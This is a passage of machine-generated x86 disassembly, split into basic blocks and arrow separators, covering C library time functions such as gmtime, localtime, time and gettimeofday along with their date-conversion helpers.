0xb0a4221:	mov	dword ptr [edx + eax], 0x54
0xb0a4228:	add	esp, 0x18c
0xb0a422e:	mov	eax, esi
0xb0a4230:	pop	ebx
0xb0a4231:	pop	esi
0xb0a4232:	pop	edi
0xb0a4233:	pop	ebp
0xb0a4234:	ret	
None
|
|
|
v
0xb0a40ea:	mov	ebp, edx
0xb0a40ec:	mov	dword ptr [esp + 4], esi
0xb0a40f0:	mov	dword ptr [esp], ebp
0xb0a40f3:	call	0xb017480
None
|
|
|
v
0xb0a41dd:	add	esp, 0x18c
0xb0a41e3:	mov	eax, esi
0xb0a41e5:	pop	ebx
0xb0a41e6:	pop	esi
0xb0a41e7:	pop	edi
0xb0a41e8:	pop	ebp
0xb0a41e9:	ret	
None
|
|
|
v
0xb0a40f8:	mov	dword ptr [esp], edi
0xb0a40fb:	lea	esi, dword ptr [ebp + eax + 1]
0xb0a40ff:	call	0xb123900
None
|
|
|
v
0xb0a4305:	sub	esi, 1
0xb0a4308:	test	ecx, ecx
0xb0a430a:	setne	cl
0xb0a430d:	test	eax, eax
0xb0a430f:	mov	edi, ecx
0xb0a4311:	setne	cl
0xb0a4314:	cmp	eax, 4
0xb0a4317:	mov	ebp, ecx
0xb0a4319:	setne	cl
0xb0a431c:	jmp	0xb0a41c6
None
|
|
|
v
0xb0a40a0:	lea	eax, dword ptr [esp + 0x80]
0xb0a40a7:	mov	dword ptr [esp + 0x38], eax
0xb0a40ab:	lea	eax, dword ptr [esp + 0x4c]
0xb0a40af:	mov	dword ptr [esp + 0x30], eax
0xb0a40b3:	lea	eax, dword ptr [esp + 0x5c]
0xb0a40b7:	mov	dword ptr [esp + 0x34], eax
0xb0a40bb:	jmp	0xb0a40ec
None
|
|
|
v
0xb0a40d3:	cmp	byte ptr [edx - 1], 0
0xb0a40d7:	je	0xb0a4168
None
|
|
|
v
0xb0a4141:	cmp	eax, 4
0xb0a4144:	setne	cl
0xb0a4147:	cmp	eax, 7
0xb0a414a:	setne	dl
0xb0a414d:	and	dl, cl
0xb0a414f:	je	0xb0a40c0
None
|
|
|
v
0xb0a3ff0:	push	ebp
0xb0a3ff1:	push	edi
0xb0a3ff2:	push	esi
0xb0a3ff3:	push	ebx
0xb0a3ff4:	sub	esp, 0x18c
0xb0a3ffa:	mov	eax, dword ptr [esp + 0x1ac]
0xb0a4001:	mov	dword ptr [esp + 0x7c], 0
0xb0a4009:	mov	esi, dword ptr [esp + 0x1a8]
0xb0a4010:	call	0xb1267db
None
|
|
|
v
0xb0a40ec:	mov	dword ptr [esp + 4], esi
0xb0a40f0:	mov	dword ptr [esp], ebp
0xb0a40f3:	call	0xb017480
None
|
|
|
v
0xb0a41f0:	mov	edi, ecx
0xb0a41f2:	mov	ebp, 1
0xb0a41f7:	mov	edx, edi
0xb0a41f9:	test	dl, dl
0xb0a41fb:	jne	0xb0a41cc
None
|
|
|
v
0xb0a41d4:	cmp	eax, 5
0xb0a41d7:	jne	0xb0a43cb
None
|
|
|
v
0xb0a4298:	mov	dword ptr [esp], edi
0xb0a429b:	mov	dword ptr [esp + 0x5c], ebp
0xb0a429f:	call	0xb123900
None
|
|
|
v
0xb0a419d:	mov	edx, dword ptr [esp + 0x70]
0xb0a41a1:	mov	edx, dword ptr [edx]
0xb0a41a3:	test	edx, edx
0xb0a41a5:	jne	0xb0a438b
None
|
|
|
v
0xb0a404e:	mov	eax, dword ptr [eax]
0xb0a4050:	mov	ecx, dword ptr [eax]
0xb0a4052:	mov	dword ptr [esp + 0x2c], eax
0xb0a4056:	mov	edi, dword ptr [eax + 0x14]
0xb0a4059:	test	ecx, ecx
0xb0a405b:	je	0xb0a4067
None
|
|
|
v
0xb0a404b:	mov	eax, dword ptr [edi + 0x14]
0xb0a404e:	mov	eax, dword ptr [eax]
0xb0a4050:	mov	ecx, dword ptr [eax]
0xb0a4052:	mov	dword ptr [esp + 0x2c], eax
0xb0a4056:	mov	edi, dword ptr [eax + 0x14]
0xb0a4059:	test	ecx, ecx
0xb0a405b:	je	0xb0a4067
None
|
|
|
v
0xb0a42f7:	mov	ecx, eax
0xb0a42f9:	and	ecx, 0xfffffffb
0xb0a42fc:	jne	0xb0a4308
None
|
|
|
v
0xb0a40dd:	mov	esi, dword ptr [esp + 0x60]
0xb0a40e1:	sub	esi, ebp
0xb0a40e3:	sar	esi, 2
0xb0a40e6:	test	esi, esi
0xb0a40e8:	je	0xb0a4168
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a5d40
TOTAL BLOCKS :24
0xb0a5d98:	sub	ecx, 0x15180
0xb0a5d9e:	add	edi, 1
0xb0a5da1:	cmp	ecx, 0x1517f
0xb0a5da7:	jg	0xb0a5d98
None
|
|
|
v
0xb0a5f98:	sar	edx, 7
0xb0a5f9b:	mov	eax, edi
0xb0a5f9d:	sub	edx, ecx
0xb0a5f9f:	imul	edx, edx, 0x190
0xb0a5fa5:	sub	eax, edx
0xb0a5fa7:	cmp	eax, 1
0xb0a5faa:	sbb	eax, eax
0xb0a5fac:	not	eax
0xb0a5fae:	add	eax, 0x16e
0xb0a5fb3:	cmp	dword ptr [esp + 8], eax
0xb0a5fb7:	jge	0xb0a5e38
None
|
|
|
v
0xb0a5d55:	add	ebx, 0x1052ab
0xb0a5d5b:	mov	ecx, dword ptr [eax]
0xb0a5d5d:	mov	eax, ecx
0xb0a5d5f:	imul	edx
0xb0a5d61:	mov	eax, ecx
0xb0a5d63:	sar	eax, 0x1f
0xb0a5d66:	add	edx, ecx
0xb0a5d68:	sar	edx, 0x10
0xb0a5d6b:	mov	edi, edx
0xb0a5d6d:	sub	edi, eax
0xb0a5d6f:	imul	eax, edi, 0x15180
0xb0a5d75:	sub	ecx, eax
0xb0a5d77:	add	ecx, dword ptr [esp + 0x2c]
0xb0a5d7b:	jns	0xb0a5da1
None
|
|
|
v
0xb0a5da1:	cmp	ecx, 0x1517f
0xb0a5da7:	jg	0xb0a5d98
None
|
|
|
v
0xb0a5d7d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a5f4c:	imul	eax, eax, 0x16d
0xb0a5f52:	mov	dword ptr [esp], ecx
0xb0a5f55:	add	esi, eax
0xb0a5f57:	add	edi, esi
0xb0a5f59:	add	dword ptr [esp + 8], edi
0xb0a5f5d:	mov	eax, dword ptr [esp + 8]
0xb0a5f61:	test	eax, eax
0xb0a5f63:	js	0xb0a5e38
None
|
|
|
v
0xb0a5fbd:	mov	eax, dword ptr [esp]
0xb0a5fc0:	mov	esi, dword ptr [esp + 0x30]
0xb0a5fc4:	mov	edi, dword ptr [esp + 8]
0xb0a5fc8:	sub	eax, 0x76c
0xb0a5fcd:	mov	dword ptr [esi + 0x14], eax
0xb0a5fd0:	xor	eax, eax
0xb0a5fd2:	test	ebp, ebp
0xb0a5fd4:	mov	dword ptr [esi + 0x1c], edi
0xb0a5fd7:	jne	0xb0a5ffe
None
|
|
|
v
0xb0a5fd9:	mov	eax, dword ptr [esp]
0xb0a5fdc:	mov	edx, 0x51eb851f
0xb0a5fe1:	mov	ebp, dword ptr [esp]
0xb0a5fe4:	imul	edx
0xb0a5fe6:	mov	eax, 1
0xb0a5feb:	mov	ecx, ebp
0xb0a5fed:	sar	ecx, 0x1f
0xb0a5ff0:	mov	esi, edx
0xb0a5ff2:	sar	esi, 5
0xb0a5ff5:	sub	esi, ecx
0xb0a5ff7:	imul	esi, esi, 0x64
0xb0a5ffa:	cmp	ebp, esi
0xb0a5ffc:	je	0xb0a6040
None
|
|
|
v
0xb0a5e1e:	mov	esi, dword ptr [esp + 0x30]
0xb0a5e22:	mov	dword ptr [esp], 0x7b2
0xb0a5e29:	mov	dword ptr [esp + 8], edi
0xb0a5e2d:	mov	dword ptr [esi + 0x18], eax
0xb0a5e30:	jmp	0xb0a5f5d
None
|
|
|
v
0xb0a5d80:	sub	edi, 1
0xb0a5d83:	add	ecx, 0x15180
0xb0a5d89:	js	0xb0a5d80
None
|
|
|
v
0xb0a5f69:	mov	ebp, dword ptr [esp]
0xb0a5f6c:	mov	eax, 0x16d
0xb0a5f71:	and	ebp, 3
0xb0a5f74:	jne	0xb0a5fb3
None
|
|
|
v
0xb0a6058:	add	eax, 7
0xb0a605b:	jmp	0xb0a5e1e
None
|
|
|
v
0xb0a5ffe:	imul	eax, eax, 0x1a
0xb0a6001:	mov	edx, 0xb
0xb0a6006:	lea	ecx, dword ptr [ebx + eax - 0x4e860]
0xb0a600d:	movzx	eax, word ptr [ecx + 0x16]
0xb0a6011:	cmp	eax, edi
0xb0a6013:	jle	0xb0a6020
None
|
|
|
v
0xb0a6015:	sub	edx, 1
0xb0a6018:	movzx	eax, word ptr [ecx + edx*2]
0xb0a601c:	cmp	eax, edi
0xb0a601e:	jg	0xb0a6015
None
|
|
|
v
0xb0a6040:	sar	edx, 7
0xb0a6043:	sub	edx, ecx
0xb0a6045:	imul	eax, edx, 0x190
0xb0a604b:	cmp	ebp, eax
0xb0a604d:	sete	al
0xb0a6050:	movzx	eax, al
0xb0a6053:	jmp	0xb0a5ffe
None
|
|
|
v
0xb0a5fb3:	cmp	dword ptr [esp + 8], eax
0xb0a5fb7:	jge	0xb0a5e38
None
|
|
|
v
0xb0a5f76:	mov	edi, dword ptr [esp]
0xb0a5f79:	mov	eax, 0x51eb851f
0xb0a5f7e:	imul	edi
0xb0a5f80:	mov	ecx, edi
0xb0a5f82:	sar	ecx, 0x1f
0xb0a5f85:	mov	eax, 0x16e
0xb0a5f8a:	mov	esi, edx
0xb0a5f8c:	sar	esi, 5
0xb0a5f8f:	sub	esi, ecx
0xb0a5f91:	imul	esi, esi, 0x64
0xb0a5f94:	cmp	edi, esi
0xb0a5f96:	jne	0xb0a5fb3
None
|
|
|
v
0xb0a5d40:	push	ebp
0xb0a5d41:	mov	edx, 0xc22e4507
0xb0a5d46:	push	edi
0xb0a5d47:	push	esi
0xb0a5d48:	push	ebx
0xb0a5d49:	sub	esp, 0x14
0xb0a5d4c:	mov	eax, dword ptr [esp + 0x28]
0xb0a5d50:	call	0xb1267db
None
|
|
|
v
0xb0a5d8b:	cmp	ecx, 0x1517f
0xb0a5d91:	jle	0xb0a5da9
None
|
|
|
v
0xb0a5da9:	mov	eax, ecx
0xb0a5dab:	mov	edx, 0x91a2b3c5
0xb0a5db0:	imul	edx
0xb0a5db2:	mov	esi, ecx
0xb0a5db4:	sar	esi, 0x1f
0xb0a5db7:	lea	eax, dword ptr [edx + ecx]
0xb0a5dba:	mov	edx, 0x88888889
0xb0a5dbf:	sar	eax, 0xb
0xb0a5dc2:	sub	eax, esi
0xb0a5dc4:	mov	esi, dword ptr [esp + 0x30]
0xb0a5dc8:	mov	dword ptr [esi + 8], eax
0xb0a5dcb:	imul	eax, eax, 0xe10
0xb0a5dd1:	sub	ecx, eax
0xb0a5dd3:	mov	eax, ecx
0xb0a5dd5:	mov	esi, ecx
0xb0a5dd7:	imul	edx
0xb0a5dd9:	sar	esi, 0x1f
0xb0a5ddc:	lea	eax, dword ptr [edx + ecx]
0xb0a5ddf:	mov	edx, 0x92492493
0xb0a5de4:	sar	eax, 5
0xb0a5de7:	sub	eax, esi
0xb0a5de9:	mov	esi, dword ptr [esp + 0x30]
0xb0a5ded:	mov	dword ptr [esi + 4], eax
0xb0a5df0:	imul	eax, eax, 0x3c
0xb0a5df3:	sub	ecx, eax
0xb0a5df5:	mov	dword ptr [esi], ecx
0xb0a5df7:	lea	ecx, dword ptr [edi + 4]
0xb0a5dfa:	mov	eax, ecx
0xb0a5dfc:	mov	esi, ecx
0xb0a5dfe:	imul	edx
0xb0a5e00:	sar	esi, 0x1f
0xb0a5e03:	lea	eax, dword ptr [edx + ecx]
0xb0a5e06:	sar	eax, 2
0xb0a5e09:	sub	eax, esi
0xb0a5e0b:	lea	edx, dword ptr [eax*8]
0xb0a5e12:	sub	edx, eax
0xb0a5e14:	sub	ecx, edx
0xb0a5e16:	mov	eax, ecx
0xb0a5e18:	js	0xb0a6058
None
|
|
|
v
0xb0a5d93:	nop	
0xb0a5d94:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a5f5d:	mov	eax, dword ptr [esp + 8]
0xb0a5f61:	test	eax, eax
0xb0a5f63:	js	0xb0a5e38
None
|
|
|
v
0xb0a6020:	mov	esi, dword ptr [esp + 0x30]
0xb0a6024:	sub	edi, eax
0xb0a6026:	mov	eax, edi
0xb0a6028:	add	eax, 1
0xb0a602b:	mov	dword ptr [esi + 0xc], eax
0xb0a602e:	mov	eax, 1
0xb0a6033:	mov	dword ptr [esi + 0x10], edx
0xb0a6036:	add	esp, 0x14
0xb0a6039:	pop	ebx
0xb0a603a:	pop	esi
0xb0a603b:	pop	edi
0xb0a603c:	pop	ebp
0xb0a603d:	ret	
None
|
|
|
v
0xb0a5e38:	mov	eax, dword ptr [esp + 8]
0xb0a5e3c:	mov	edx, 0xb38cf9b1
0xb0a5e41:	mov	esi, dword ptr [esp + 8]
0xb0a5e45:	mov	edi, dword ptr [esp]
0xb0a5e48:	imul	edx
0xb0a5e4a:	mov	eax, esi
0xb0a5e4c:	sar	eax, 0x1f
0xb0a5e4f:	add	edx, esi
0xb0a5e51:	sar	edx, 8
0xb0a5e54:	sub	edx, eax
0xb0a5e56:	mov	eax, esi
0xb0a5e58:	lea	ecx, dword ptr [edx + edi]
0xb0a5e5b:	imul	edx, edx, 0x16d
0xb0a5e61:	sub	eax, edx
0xb0a5e63:	shr	eax, 0x1f
0xb0a5e66:	sub	ecx, eax
0xb0a5e68:	mov	dword ptr [esp + 0xc], ecx
0xb0a5e6c:	lea	eax, dword ptr [ecx - 1]
0xb0a5e6f:	mov	ecx, edi
0xb0a5e71:	add	edi, 2
0xb0a5e74:	sub	ecx, 1
0xb0a5e77:	mov	esi, ecx
0xb0a5e79:	cmovns	edi, ecx
0xb0a5e7c:	sar	esi, 0x1f
0xb0a5e7f:	mov	edx, esi
0xb0a5e81:	shr	edx, 0x1e
0xb0a5e84:	mov	dword ptr [esp + 4], eax
0xb0a5e88:	mov	eax, edx
0xb0a5e8a:	lea	edx, dword ptr [ecx + edx]
0xb0a5e8d:	and	edx, 3
0xb0a5e90:	sub	edx, eax
0xb0a5e92:	mov	eax, 0x51eb851f
0xb0a5e97:	shr	edx, 0x1f
0xb0a5e9a:	sar	edi, 2
0xb0a5e9d:	sub	edi, edx
0xb0a5e9f:	imul	ecx
0xb0a5ea1:	mov	dword ptr [esp + 0x10], edi
0xb0a5ea5:	mov	edi, ecx
0xb0a5ea7:	mov	ebp, edx
0xb0a5ea9:	sar	ebp, 5
0xb0a5eac:	mov	eax, ebp
0xb0a5eae:	sub	ebp, esi
0xb0a5eb0:	imul	ebp, ebp, 0x64
0xb0a5eb3:	sar	edx, 7
0xb0a5eb6:	sub	edx, esi
0xb0a5eb8:	sub	edi, ebp
0xb0a5eba:	mov	ebp, edi
0xb0a5ebc:	mov	edi, esi
0xb0a5ebe:	sub	edi, eax
0xb0a5ec0:	shr	ebp, 0x1f
0xb0a5ec3:	add	ebp, edi
0xb0a5ec5:	mov	edi, dword ptr [esp + 0x10]
0xb0a5ec9:	imul	eax, edx, 0x190
0xb0a5ecf:	add	edi, ebp
0xb0a5ed1:	mov	ebp, dword ptr [esp + 4]
0xb0a5ed5:	sub	ecx, eax
0xb0a5ed7:	mov	eax, 0x51eb851f
0xb0a5edc:	shr	ecx, 0x1f
0xb0a5edf:	sub	edx, ecx
0xb0a5ee1:	add	edi, edx
0xb0a5ee3:	imul	ebp
0xb0a5ee5:	mov	eax, ebp
0xb0a5ee7:	sar	eax, 0x1f
0xb0a5eea:	mov	esi, edx
0xb0a5eec:	sar	esi, 7
0xb0a5eef:	mov	ecx, esi
0xb0a5ef1:	sub	esi, eax
0xb0a5ef3:	imul	esi, esi, 0x190
0xb0a5ef9:	sar	edx, 5
0xb0a5efc:	sub	ebp, esi
0xb0a5efe:	mov	esi, ebp
0xb0a5f00:	mov	ebp, eax
0xb0a5f02:	sub	ebp, ecx
0xb0a5f04:	shr	esi, 0x1f
0xb0a5f07:	add	esi, ebp
0xb0a5f09:	sub	edx, eax
0xb0a5f0b:	mov	ebp, dword ptr [esp + 4]
0xb0a5f0f:	imul	ecx, edx, 0x64
0xb0a5f12:	shr	eax, 0x1e
0xb0a5f15:	sub	ebp, ecx
0xb0a5f17:	mov	ecx, ebp
0xb0a5f19:	mov	ebp, dword ptr [esp + 4]
0xb0a5f1d:	shr	ecx, 0x1f
0xb0a5f20:	sub	edx, ecx
0xb0a5f22:	lea	ecx, dword ptr [ebp + eax]
0xb0a5f26:	and	ecx, 3
0xb0a5f29:	sub	ecx, eax
0xb0a5f2b:	mov	eax, dword ptr [esp + 0xc]
0xb0a5f2f:	shr	ecx, 0x1f
0xb0a5f32:	add	eax, 2
0xb0a5f35:	test	ebp, ebp
0xb0a5f37:	cmovns	eax, ebp
0xb0a5f3a:	sar	eax, 2
0xb0a5f3d:	sub	ecx, eax
0xb0a5f3f:	mov	eax, dword ptr [esp]
0xb0a5f42:	add	edx, ecx
0xb0a5f44:	mov	ecx, dword ptr [esp + 0xc]
0xb0a5f48:	add	esi, edx
0xb0a5f4a:	sub	eax, ecx
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gmtime_r
TOTAL BLOCKS :3
0xb0a628d:	add	ebx, 0x104d73
0xb0a6293:	mov	dword ptr [esp + 4], 0
0xb0a629b:	mov	dword ptr [esp + 8], eax
0xb0a629f:	mov	eax, dword ptr [esp + 0x20]
0xb0a62a3:	mov	dword ptr [esp], eax
0xb0a62a6:	call	0xb0a7bc0
None
|
|
|
v
0xb0a6280:	push	ebx
0xb0a6281:	sub	esp, 0x18
0xb0a6284:	mov	eax, dword ptr [esp + 0x24]
0xb0a6288:	call	0xb1267db
None
|
|
|
v
0xb0a62ab:	add	esp, 0x18
0xb0a62ae:	pop	ebx
0xb0a62af:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gmtime
TOTAL BLOCKS :3
0xb0a62b0:	push	ebx
0xb0a62b1:	call	0xb1267db
None
|
|
|
v
0xb0a62b6:	add	ebx, 0x104d4a
0xb0a62bc:	sub	esp, 0x18
0xb0a62bf:	mov	dword ptr [esp + 4], 0
0xb0a62c7:	lea	eax, dword ptr [ebx + 0x3780]
0xb0a62cd:	mov	dword ptr [esp + 8], eax
0xb0a62d1:	mov	eax, dword ptr [esp + 0x20]
0xb0a62d5:	mov	dword ptr [esp], eax
0xb0a62d8:	call	0xb0a7bc0
None
|
|
|
v
0xb0a62dd:	add	esp, 0x18
0xb0a62e0:	pop	ebx
0xb0a62e1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:localtime
TOTAL BLOCKS :3
0xb0a6320:	push	ebx
0xb0a6321:	call	0xb1267db
None
|
|
|
v
0xb0a6326:	add	ebx, 0x104cda
0xb0a632c:	sub	esp, 0x18
0xb0a632f:	mov	dword ptr [esp + 4], 1
0xb0a6337:	lea	eax, dword ptr [ebx + 0x3780]
0xb0a633d:	mov	dword ptr [esp + 8], eax
0xb0a6341:	mov	eax, dword ptr [esp + 0x20]
0xb0a6345:	mov	dword ptr [esp], eax
0xb0a6348:	call	0xb0a7bc0
None
|
|
|
v
0xb0a634d:	add	esp, 0x18
0xb0a6350:	pop	ebx
0xb0a6351:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:time
TOTAL BLOCKS :4
0xb0a6b80:	xor	eax, eax
0xb0a6b82:	mov	edx, dword ptr [esp + 4]
0xb0a6b86:	mov	ecx, eax
0xb0a6b88:	xchg	ebx, ecx
0xb0a6b8a:	mov	eax, 0xd
0xb0a6b8f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0a6b9c:	mov	dword ptr [edx], eax
0xb0a6b9e:	ret	
None
|
|
|
v
0xb0a6b9e:	ret	
None
|
|
|
v
0xb0a6b96:	xchg	ebx, ecx
0xb0a6b98:	test	edx, edx
0xb0a6b9a:	je	0xb0a6b9e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gettimeofday
TOTAL BLOCKS :5
0xb0a6ba0:	mov	edx, ebx
0xb0a6ba2:	mov	ecx, dword ptr [esp + 8]
0xb0a6ba6:	mov	ebx, dword ptr [esp + 4]
0xb0a6baa:	mov	eax, 0x4e
0xb0a6baf:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0a6bb6:	mov	ebx, edx
0xb0a6bb8:	cmp	eax, 0xfffff001
0xb0a6bbd:	jae	0xb0a6bc0
None
|
|
|
v
0xb0a6bc5:	add	ecx, 0x10443b
0xb0a6bcb:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0a6bd1:	neg	eax
0xb0a6bd3:	add	ecx, dword ptr gs:[0]
0xb0a6bda:	mov	dword ptr [ecx], eax
0xb0a6bdc:	or	eax, 0xffffffff
0xb0a6bdf:	ret	
None
|
|
|
v
0xb0a6bc0:	call	0xb1267df
None
|
|
|
v
0xb0a6bbf:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a6d70
TOTAL BLOCKS :1
0xb0a6d70:	push	edi
0xb0a6d71:	mov	ecx, 0x3b
0xb0a6d76:	push	esi
0xb0a6d77:	mov	esi, dword ptr [esp + 0xc]
0xb0a6d7b:	cmp	eax, 0x3b
0xb0a6d7e:	cmova	eax, ecx
0xb0a6d81:	mov	edi, 0x18
0xb0a6d86:	cmp	esi, 0x18
0xb0a6d89:	cmova	esi, edi
0xb0a6d8c:	imul	esi, esi, 0xe10
0xb0a6d92:	add	eax, esi
0xb0a6d94:	cmp	edx, 0x3b
0xb0a6d97:	cmova	edx, ecx
0xb0a6d9a:	imul	edx, edx, 0x3c
0xb0a6d9d:	pop	esi
0xb0a6d9e:	pop	edi
0xb0a6d9f:	add	eax, edx
0xb0a6da1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a6db0
TOTAL BLOCKS :29
0xb0a6e24:	jb	0xb0a6fc0
None
|
|
|
v
0xb0a702a:	add	esi, 0x15180
0xb0a7030:	jmp	0xb0a6fcc
None
|
|
|
v
0xb0a6e75:	movzx	edi, word ptr [ecx + 8]
0xb0a6e79:	lea	edx, dword ptr [eax + eax]
0xb0a6e7c:	add	edx, eax
0xb0a6e7e:	lea	eax, dword ptr [eax + edx*4]
0xb0a6e81:	add	eax, edi
0xb0a6e83:	add	edi, 9
0xb0a6e86:	movzx	edx, word ptr [ebx + eax*2 - 0x4e862]
0xb0a6e8e:	mov	dword ptr [esp + 0xc], eax
0xb0a6e92:	imul	eax, edx, 0x15180
0xb0a6e98:	mov	dword ptr [esp + 4], edx
0xb0a6e9c:	mov	edx, 0x2aaaaaab
0xb0a6ea1:	add	esi, eax
0xb0a6ea3:	mov	eax, edi
0xb0a6ea5:	imul	edx
0xb0a6ea7:	mov	dword ptr [esp + 8], esi
0xb0a6eab:	mov	esi, ebp
0xb0a6ead:	shr	edx, 1
0xb0a6eaf:	lea	eax, dword ptr [edx + edx*2]
0xb0a6eb2:	mov	edx, 0x51eb851f
0xb0a6eb7:	shl	eax, 2
0xb0a6eba:	sub	edi, eax
0xb0a6ebc:	add	edi, 1
0xb0a6ebf:	cmp	word ptr [ecx + 8], 3
0xb0a6ec4:	sbb	esi, 0
0xb0a6ec7:	mov	eax, esi
0xb0a6ec9:	imul	edx
0xb0a6ecb:	mov	eax, esi
0xb0a6ecd:	sar	eax, 0x1f
0xb0a6ed0:	imul	edi, edi, 0x1a
0xb0a6ed3:	sar	edx, 5
0xb0a6ed6:	sub	edx, eax
0xb0a6ed8:	imul	eax, edx, 0x64
0xb0a6edb:	sub	edi, 2
0xb0a6ede:	mov	dword ptr [esp], edx
0xb0a6ee1:	mov	edx, 0x66666667
0xb0a6ee6:	sub	esi, eax
0xb0a6ee8:	mov	eax, edi
0xb0a6eea:	imul	edx
0xb0a6eec:	sar	edi, 0x1f
0xb0a6eef:	lea	eax, dword ptr [esi + 3]
0xb0a6ef2:	sar	edx, 2
0xb0a6ef5:	sub	edx, edi
0xb0a6ef7:	test	esi, esi
0xb0a6ef9:	lea	edx, dword ptr [esi + edx + 1]
0xb0a6efd:	cmovs	esi, eax
0xb0a6f00:	sar	esi, 2
0xb0a6f03:	add	esi, edx
0xb0a6f05:	mov	edx, dword ptr [esp]
0xb0a6f08:	test	edx, edx
0xb0a6f0a:	lea	eax, dword ptr [edx + 3]
0xb0a6f0d:	cmovns	eax, edx
0xb0a6f10:	neg	edx
0xb0a6f12:	sar	eax, 2
0xb0a6f15:	add	eax, esi
0xb0a6f17:	lea	esi, dword ptr [eax + edx*2]
0xb0a6f1a:	mov	edx, 0x92492493
0xb0a6f1f:	mov	eax, esi
0xb0a6f21:	mov	edi, esi
0xb0a6f23:	imul	edx
0xb0a6f25:	sar	edi, 0x1f
0xb0a6f28:	lea	eax, dword ptr [edx + esi]
0xb0a6f2b:	sar	eax, 2
0xb0a6f2e:	sub	eax, edi
0xb0a6f30:	movzx	edi, word ptr [ecx + 0xa]
0xb0a6f34:	lea	edx, dword ptr [eax*8]
0xb0a6f3b:	sub	edx, eax
0xb0a6f3d:	sub	esi, edx
0xb0a6f3f:	test	esi, esi
0xb0a6f41:	mov	eax, esi
0xb0a6f43:	lea	edx, dword ptr [esi + 7]
0xb0a6f46:	cmovs	eax, edx
0xb0a6f49:	movzx	edx, word ptr [ecx + 0xc]
0xb0a6f4d:	sub	edx, eax
0xb0a6f4f:	test	edx, edx
0xb0a6f51:	lea	eax, dword ptr [edx + 7]
0xb0a6f54:	cmovs	edx, eax
0xb0a6f57:	cmp	edi, 1
0xb0a6f5a:	jbe	0xb0a7049
None
|
|
|
v
0xb0a6f90:	lea	edx, dword ptr [esi + 7]
0xb0a6f93:	cmp	edx, eax
0xb0a6f95:	jge	0xb0a6f9d
None
|
|
|
v
0xb0a6fb3:	add	esp, 0x10
0xb0a6fb6:	pop	ebx
0xb0a6fb7:	pop	esi
0xb0a6fb8:	pop	edi
0xb0a6fb9:	pop	ebp
0xb0a6fba:	ret	
None
|
|
|
v
0xb0a6db0:	push	ebp
0xb0a6db1:	mov	ecx, eax
0xb0a6db3:	push	edi
0xb0a6db4:	mov	ebp, edx
0xb0a6db6:	push	esi
0xb0a6db7:	push	ebx
0xb0a6db8:	sub	esp, 0x10
0xb0a6dbb:	call	0xb1267db
None
|
|
|
v
0xb0a6f99:	cmp	esi, edi
0xb0a6f9b:	jne	0xb0a6f90
None
|
|
|
v
0xb0a6fee:	movzx	eax, word ptr [ecx + 0xc]
0xb0a6ff2:	movzx	edx, ax
0xb0a6ff5:	sub	edx, 1
0xb0a6ff8:	imul	edx, edx, 0x15180
0xb0a6ffe:	add	esi, edx
0xb0a7000:	cmp	ax, 0x3b
0xb0a7004:	jbe	0xb0a6fcc
None
|
|
|
v
0xb0a7047:	jmp	0xb0a702a
None
|
|
|
v
0xb0a6dcf:	cmp	dword ptr [eax + 0x1c], edx
0xb0a6dd2:	je	0xb0a6fb3
None
|
|
|
v
0xb0a6f60:	mov	eax, dword ptr [esp + 0xc]
0xb0a6f64:	lea	esi, dword ptr [edx + 7]
0xb0a6f67:	movzx	eax, word ptr [ebx + eax*2 - 0x4e860]
0xb0a6f6f:	sub	eax, dword ptr [esp + 4]
0xb0a6f73:	cmp	eax, esi
0xb0a6f75:	mov	dword ptr [esp], eax
0xb0a6f78:	jle	0xb0a7049
None
|
|
|
v
0xb0a6f97:	mov	esi, edx
0xb0a6f99:	cmp	esi, edi
0xb0a6f9b:	jne	0xb0a6f90
None
|
|
|
v
0xb0a6e3d:	mov	eax, ebp
0xb0a6e3f:	mov	edx, 0x51eb851f
0xb0a6e44:	imul	edx
0xb0a6e46:	mov	edi, ebp
0xb0a6e48:	sar	edi, 0x1f
0xb0a6e4b:	mov	eax, edx
0xb0a6e4d:	sar	eax, 5
0xb0a6e50:	sub	eax, edi
0xb0a6e52:	imul	eax, eax, 0x64
0xb0a6e55:	mov	dword ptr [esp], eax
0xb0a6e58:	mov	eax, 1
0xb0a6e5d:	cmp	ebp, dword ptr [esp]
0xb0a6e60:	jne	0xb0a6e75
None
|
|
|
v
0xb0a700e:	mov	eax, ebp
0xb0a7010:	mov	edx, 0x51eb851f
0xb0a7015:	imul	edx
0xb0a7017:	mov	eax, ebp
0xb0a7019:	sar	eax, 0x1f
0xb0a701c:	mov	edi, edx
0xb0a701e:	sar	edi, 5
0xb0a7021:	sub	edi, eax
0xb0a7023:	imul	edi, edi, 0x64
0xb0a7026:	cmp	ebp, edi
0xb0a7028:	je	0xb0a7038
None
|
|
|
v
0xb0a6f9d:	imul	esi, esi, 0x15180
0xb0a6fa3:	add	esi, dword ptr [esp + 8]
0xb0a6fa7:	sub	esi, dword ptr [ecx + 0x14]
0xb0a6faa:	add	esi, dword ptr [ecx + 0x10]
0xb0a6fad:	mov	dword ptr [ecx + 0x1c], ebp
0xb0a6fb0:	mov	dword ptr [ecx + 0x18], esi
0xb0a6fb3:	add	esp, 0x10
0xb0a6fb6:	pop	ebx
0xb0a6fb7:	pop	esi
0xb0a6fb8:	pop	edi
0xb0a6fb9:	pop	ebp
0xb0a6fba:	ret	
None
|
|
|
v
0xb0a6fcc:	sub	esi, dword ptr [ecx + 0x14]
0xb0a6fcf:	add	esi, dword ptr [ecx + 0x10]
0xb0a6fd2:	mov	dword ptr [ecx + 0x1c], ebp
0xb0a6fd5:	mov	dword ptr [ecx + 0x18], esi
0xb0a6fd8:	add	esp, 0x10
0xb0a6fdb:	pop	ebx
0xb0a6fdc:	pop	esi
